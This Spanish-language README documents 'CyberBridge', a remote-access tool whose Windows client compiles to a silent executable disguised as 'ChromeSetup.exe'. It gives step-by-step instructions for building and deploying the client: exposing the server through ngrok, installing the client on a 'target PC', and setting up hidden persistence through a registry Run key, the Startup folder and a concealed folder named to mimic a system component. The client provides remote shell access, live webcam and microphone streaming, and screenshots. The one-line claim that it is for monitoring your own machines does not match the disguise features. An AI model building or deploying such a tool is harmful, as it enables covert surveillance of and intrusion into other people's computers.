# 🟢 CyberBridge - Guía de Instalación y Uso

> Sistema de monitoreo remoto para tu PC personal.  
> Interfaz de servidor (verde/negro) + cliente compilado como `.exe`.

---

## 📁 Estructura del Proyecto

```
CyberBridge/
├── CyberBridge/           # Carpeta principal del proyecto
│   ├── shared/             # Protocolo y criptografía compartida
│   │   ├── protocol.py
│   │   └── crypto.py
│   │
│   ├── client/             # Cliente que se ejecuta en la PC objetivo (compilado a .exe)
│   │   ├── main.py        # Punto de entrada
│   │   ├── config.py      # Configuración del servidor (URL)
│   │   ├── service.py     # Servicio Windows principal
│   │   └── core/
│   │       ├── rpc_client.py
│   │       ├── persistence.py
│   │       └── watchdog.py
│   │
│   ├── server/            # Servidor con interfaz gráfica
│   │   ├── main.py        # Punto de entrada → inicia el Dashboard
│   │   ├── config.py      # Puertos, timeouts, configuración UI
│   │   ├── core/
│   │   │   └── session_manager.py  # Servidor HTTP Flask + gestión de sesiones
│   │   └── ui/
│   │       ├── styles.py
│   │       ├── dashboard.py
│   │       ├── connection_panel.py
│   │       ├── terminal_panel.py
│   │       ├── camera_panel.py
│   │       ├── screenshot_panel.py
│   │       ├── sysinfo_panel.py
│   │       └── audio_panel.py
│   │
│   ├── requirements.txt    # Dependencias Python
│   ├── build_client.py    # Script PyInstaller para compilar el cliente
│   └── README.md
│
├── dist/                   # Aquí se genera el .exe compilado
└── build/                  # Archivos temporales de compilación
```

---

## 🛠️ Requisitos Previos

### En tu máquina (servidor):
- Python 3.10+
- pip
- ngrok instalado y configurado

### En la PC objetivo (cliente):
- Windows 10/11
- Python 3.10+ (si ejecutas sin compilar)
- Para el .exe compilado: solo Windows (no necesita Python)

---

## 📦 Paso 1: Instalar Dependencias

En la carpeta raíz del proyecto, ejecuta:

```bash
cd CyberBridge
pip install -r requirements.txt
```

Esto instalará:
- **Flask + Werkzeug** - Servidor HTTP
- **requests** - Cliente HTTP
- **psutil** - Información del sistema
- **cryptography** - Criptografía
- **opencv-python** - Cámara
- **Pillow** - Capturas de pantalla
- **pyaudio** - Audio
- **pywin32** - Servicio Windows
- **pyinstaller** - Compilación a .exe

---

## ⚙️ Paso 2: Configurar la URL del Servidor

El cliente necesita saber dónde está el servidor. Edita el archivo:

### 📂 `CyberBridge/client/config.py`

```python
# ─── Server address ────────────────────────────────────────────────────────────
SERVER_URL = "https://TU-URL-NGROK.ngrok-free.app"

# ─── Polling ──────────────────────────────────────────────────────────────────
POLL_INTERVAL = 3  # Segundos entre cada petición de comandos al servidor
```

### Opciones de URL según tu caso:

| Método | URL a configurar |
|--------|------------------|
| **ngrok** | `https://xxxx-xxx-xxx-xxx.ngrok-free.app` |
| **Tailscale** | `http://100.x.x.x:18812` |
| **LAN (red local)** | `http://192.168.x.x:18812` |

> **IMPORTANTE**: Cambia la URL ANTES de compilar el cliente. Si cambias la URL después de compilar, tendrás que recompilar.

---

## 🚀 Paso 3: Levantar ngrok

El servidor corre en el puerto 18812. Expón ese puerto con ngrok:

### En una terminal separada, ejecuta:

```bash
ngrok http 18812 --log=stdout
```

O simplemente:

```bash
ngrok http 18812
```

### Copia la URL pública que ngrok te da
Se verá algo como:
```
https://1b19-190-107-209-205.ngrok-free.app
```

Usa esa URL en `client/config.py` como se explicó arriba.

---

## 🖥️ Paso 4: Iniciar el Backend (Servidor)

Desde la carpeta del proyecto, ejecuta:

```bash
cd CyberBridge
python -m server.main
```

O alternativamente:

```bash
cd CyberBridge
python server/main.py
```

Esto abrirá la interfaz gráfica del servidor con:
- Panel de conexiones (izquierda)
- Terminal remota
- Información del sistema (CPU, RAM, disco)
- Cámara web en vivo
- Capturas de pantalla
- Audio en vivo
- Matrix rain decorativo 😎

---

## 🏗️ Paso 5: Compilar el Cliente (Build)

Si quieres crear el archivo `.exe` para instalar en la PC objetivo:

```bash
cd CyberBridge
python build_client.py
```

### Qué hace este comando:
1. Compila el cliente en un solo archivo `.exe`
2. Oculta la ventana de consola (totalmente silencioso)
3. Genera el archivo en `dist/ChromeSetup.exe`

### Output esperado:
```
[CyberBridge] Building Windows Service .exe…
...
[CyberBridge] Done! → dist/ChromeSetup.exe

── Next steps (run as Administrator) ──────────────────────
  dist\ChromeSetup.exe install   ← register service
  dist\ChromeSetup.exe start     ← start service
  dist\ChromeSetup.exe stop       ← stop service
  dist\ChromeSetup.exe remove    ← uninstall service
```

---

## 📥 Paso 6: Instalar el Cliente en la PC Objetivo

### Opción A: Si compilaste el .exe

Copia `dist/ChromeSetup.exe` a la PC objetivo y ejecuta (como Administrador):

```cmd
dist\ChromeSetup.exe install
dist\ChromeSetup.exe start
```

### Opción B: Si ejecutas desde código Python

En la PC objetivo:

```bash
cd CyberBridge
python client/service.py install
python client/service.py start
```

---

## 🔄 Flujo de Comunicación

```
PC Objetivo (cliente)              Tu Máquina (servidor)
─────────────────────              ─────────────────────
ChromeSetup.exe starts
  ├─ Configura persistencia (Registry, Startup)
  ├─ Envía beacon HTTP al servidor cada 30s
  └─ Poll de comandos cada 3s ──────→ Servidor Flask (:18812)
                                          ├─ Registra sesión
                                          ├─ Actualiza ConnectionPanel
                                          └─ Envía comandos (terminal, cámara, audio, etc.)
                               ←─────────── Respuestas del cliente
```

---

## 🔒 Métodos de Persistencia del Cliente

| Método | Descripción |
|--------|-------------|
| **Registry Run key** | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSystemHost` |
| **Startup folder** | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSystemHost.lnk` |
| **Carpeta oculta** | `%APPDATA%\Microsoft\Windows\SystemHost\ChromeSetup.exe` (atributo oculto) |
| **Sin ventana de consola** | Compilado con `--noconsole` en PyInstaller |

---

## 🎮 Características del Servidor UI

| Pestaña | Funcionalidad |
|---------|---------------|
| **TERMINAL** | Envía comandos, ve stdout/stderr, historial (↑↓) |
| **SYSINFO** | CPU/RAM en vivo, disco, hostname, uptime |
| **CAMERA** | Frames de webcam (~6 FPS), iniciar/detener |
| **SCREENSHOT** | Captura manual o automática (10s), guardar en Desktop |
| **AUDIO** | Streaming de micrófono en vivo, grabar a WAV |
| **MATRIX** | Lluvia de matrix animada 😎 |

---

## ⚠️ Nota de Seguridad

Esta herramienta está diseñada para **monocar tus propias máquinas**.  
La clave pre-compartida en `shared/crypto.py` debería ser cambiada antes del despliegue.

---

## ❓ Solución de Problemas

### El cliente no se conecta
1. Verifica que ngrok esté corriendo y la URL sea correcta
2. Revisa que `client/config.py` tenga la URL de ngrok
3. Verifica el log en `%APPDATA%\Microsoft\Logs\cbsvc.log`

### ngrok dice "connection refused"
1. Asegúrate de que el servidor esté corriendo (`python server/main.py`)
2. Verifica que ngrok apunte al puerto correcto (18812)

### El servicio no instala
1. Ejecuta como Administrador
2. Verifica que pywin32 esté instalado correctamente

---

## 📋 Comandos Rápidos (Resumen)

```bash
# 1. Instalar dependencias
pip install -r requirements.txt

# 2. Configurar URL en client/config.py

# 3. Levantar ngrok (en terminal separada)
ngrok http 18812

# 4. Iniciar servidor
python server/main.py

# 5. Compilar cliente (opcional)
python build_client.py

# 6. Instalar cliente en PC objetivo (como Admin)
dist\ChromeSetup.exe install
dist\ChromeSetup.exe start
```

---

¡Listo! 🎉 Ahora tienes un sistema completo de monitoreo remoto.